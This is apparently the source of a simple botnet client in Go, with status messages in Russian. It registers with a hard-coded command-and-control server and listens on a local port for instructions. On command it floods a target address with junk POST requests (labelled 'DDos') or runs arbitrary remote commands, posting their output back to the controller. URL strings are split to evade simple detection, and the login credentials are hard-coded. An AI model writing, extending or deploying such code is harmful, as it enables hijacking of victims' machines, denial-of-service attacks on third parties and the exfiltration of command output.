package main

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"net/http"
	"os"
	"os/exec"
	"strings"
	"time"
)

const (
	getCookieWaitRange = 5 * time.Second
	serverConnectWaitRange = 5 * time.Second
	serverAddr = "192.168.1.67:62323"
	muxAddr = ":31239"
	configFileName = "config.json"
	ServerPingAwaitTime = 62 * time.Second
	DDosRequestCount = 30
)

type configFileStruct struct {
	Cookie string `json:"Cookie"`
	UpdateCookie string `json:"UpdateCookie"`
}

//---------------------------------------------|Handlers|---------------------------------------------------------------

func ping(w http.ResponseWriter, _ *http.Request) {
	_, _ = w.Write([]byte("PONG"))
	serverBit <- "ok"
}

func action(_ http.ResponseWriter, r *http.Request) {
	var requestData commandStruct
	_ = json.NewDecoder(r.Body).Decode(&requestData)
	_ = r.Body.Close()
	commandChan <- requestData
}

//---------------------------------------------|Connection|-------------------------------------------------------------

type requestConnectionStruct struct {
	Cookie string `json:"Cookie"`
	UpdateCookie string `json:"UpdateCookie"`
	OperationSystem string `json:"operationSystem"`
	ListeningPort string `json:"listeningPort"`
}

type respondConnectionStruct struct {
	Info string `json:"info"`
	Status string `json:"status"`
	NewCookie string `json:"newCookie"`
}

func Connection(Cookie string, UpdateCookie string) {
	for {

		requestBody := requestConnectionStruct{
			Cookie:       Cookie,
			UpdateCookie: UpdateCookie,
			OperationSystem: "Linux",
			ListeningPort: muxAddr[1:],
		}

		byteRequestData, _ := json.Marshal(requestBody)
		r := bytes.NewReader(byteRequestData)
		resp, _ := http.Post("ht" + "tp://" + serverAddr + "/bot/connect", "", r)

		if resp != nil {

			body, _ := ioutil.ReadAll(resp.Body)
			_ = resp.Body.Close()
			var respond respondConnectionStruct
			_ = json.Unmarshal(body, &respond)

			if respond.Status == "Connected" {

				if respond.Info == "NewCookie" {
					writeNewConfig(respond.NewCookie, UpdateCookie)
					return

				} else if respond.Info == "Ok" {
					return
				}

			} else if respond.Status == "Error" {

				fmt.Println("Ошибка подключения:", respond.Info)
				if respond.Info == "BadCookie" {
					newCookie, newUpdateCookie := GetCookie()
					writeNewConfig(newCookie, newUpdateCookie)
				}
				fmt.Println("Повторная попытка подключения через", serverConnectWaitRange, "секунд")
				time.Sleep(serverConnectWaitRange)
				Connection(GlobalCookie, GlobalUpdateCookie)
				return

			} else {

				fmt.Println("Нераспознанный статус ответа от сервера")
				fmt.Println("Повторная попытка подключения через", serverConnectWaitRange, "секунд")
				time.Sleep(serverConnectWaitRange)
				Connection(Cookie, UpdateCookie)
				return

			}

		} else {
			fmt.Println("Сервер выключен")
		}
		time.Sleep(serverConnectWaitRange)
	}
}

//---------------------------------------------|Actions|----------------------------------------------------------------

func DDos(address string) {
	for i := 0; i < DDosRequestCount; i++ {
		_, _ = http.Post("ht" + "tp://" + address + "/", "", strings.NewReader("#@(#$^*@#"))
	}
	response := CommandResponse{
		Status: "Complete",
		Cookie: GlobalCookie,
	}
	byteResp, _ := json.Marshal(response)
	_, _ = http.Post("ht" + "tp://" + serverAddr + "/bot/commandStatus", "", bytes.NewReader(byteResp))
}

type CommandResponse struct {
	Status string `json:"status"`
	Cookie string `json:"cookie"`
}
func BashCommand(command string) {
	fmt.Println("Bash команда:", command)
	out, err := exec.Command(command).Output()
	if err != nil {
		response := CommandResponse{
			Status: "Error",
			Cookie: GlobalCookie,
		}
		byteResp, _ := json.Marshal(response)
		_, _ = http.Post("ht" + "tp://" + serverAddr + "/bot/commandStatus", "", bytes.NewReader(byteResp))
	} else {
		fmt.Printf("The date is %s\n", out)
		status := fmt.Sprintf("Complete(%s)", out)
		response := CommandResponse{
			Status: status,
			Cookie: GlobalCookie,
		}
		byteResp, _ := json.Marshal(response)
		_, _ = http.Post("ht" + "tp://" + serverAddr + "/bot/commandStatus", "", bytes.NewReader(byteResp))
	}
}

//---------------------------------------------|GlobalCookie|-----------------------------------------------------------------

var GlobalCookie string
var GlobalUpdateCookie string

func GetCookie() (string, string) {
	for {
		data := []byte(`{"login": "admin", "password": "12345678"}`)
		postBody := bytes.NewReader(data)
		resp, _ := http.Post("ht" + "tp://" + serverAddr + "/bot/getCookie", "", postBody)
		if resp != nil {
			body, _ := ioutil.ReadAll(resp.Body)
			_ = resp.Body.Close()
			var newCookie configFileStruct
			_ = json.Unmarshal(body, &newCookie)
			return newCookie.Cookie, newCookie.UpdateCookie
		} else {
			fmt.Println("Куки не получаются")
		}
		time.Sleep(getCookieWaitRange)
	}
}

func writeNewConfig(newCookie string, newUpdateCookie string) {
	GlobalCookie = newCookie
	GlobalUpdateCookie = newUpdateCookie
	newConfig := configFileStruct{
		Cookie:       newCookie,
		UpdateCookie: newUpdateCookie,
	}
	byteConfigData, _ := json.MarshalIndent(newConfig, "", "  ")
	_ = ioutil.WriteFile(configFileName, byteConfigData, 0)
	fmt.Println(">Configuration updated")
}

func Configuration() {
	if _, err := os.Stat("config.json"); os.IsNotExist(err) {

		_, _ = os.Create(configFileName)
		newCookie, newUpdateCookie := GetCookie()
		writeNewConfig(newCookie, newUpdateCookie)
		return

	} else {

		var configFile configFileStruct
		byteData1, _ := ioutil.ReadFile(configFileName)
		_ = json.Unmarshal(byteData1, &configFile)

		if configFile.Cookie == "" || configFile.UpdateCookie == "" {
			newCookie, newUpdateCookie := GetCookie()
			writeNewConfig(newCookie, newUpdateCookie)
			return
		}

		GlobalCookie = configFile.Cookie
		GlobalUpdateCookie = configFile.UpdateCookie

	}
	fmt.Println(">Configuration updated")
}

// -------------------------------------------------|main|--------------------------------------------------------------

type commandStruct struct {
	Command string `json:"command"`
	Option string `json:"option"`
}

var commandChan = make(chan commandStruct)
var serverBit = make(chan string)

func main() {

	Configuration()

	go func() {
		mux := http.NewServeMux()
		mux.HandleFunc("/ping", ping)
		mux.HandleFunc("/action", action)
		_ = http.ListenAndServe(muxAddr, mux)
	}()

	Connection(GlobalCookie, GlobalUpdateCookie)

	for {
		select {

		case <- time.Tick(ServerPingAwaitTime):
			fmt.Println("Время ожидания сервера истекло")
			Connection(GlobalCookie, GlobalUpdateCookie)

		case <- serverBit:
			fmt.Println("Server is alive!)")

		case cmd := <- commandChan:

			data := []byte(`{"status": "inProgress", "cookie": "` + GlobalCookie + `"}`)
			postBody := bytes.NewReader(data)
			_, _ = http.Post("ht" + "tp://" + serverAddr + "/bot/commandStatus", "", postBody)

			fmt.Println(cmd)
			switch cmd.Command {

			case "DDos":
				DDos(cmd.Option)

			case "BashCommand":
				BashCommand(cmd.Option)

			default:
				fmt.Println("Нераспознанная команда")
			}
		}
	}
}
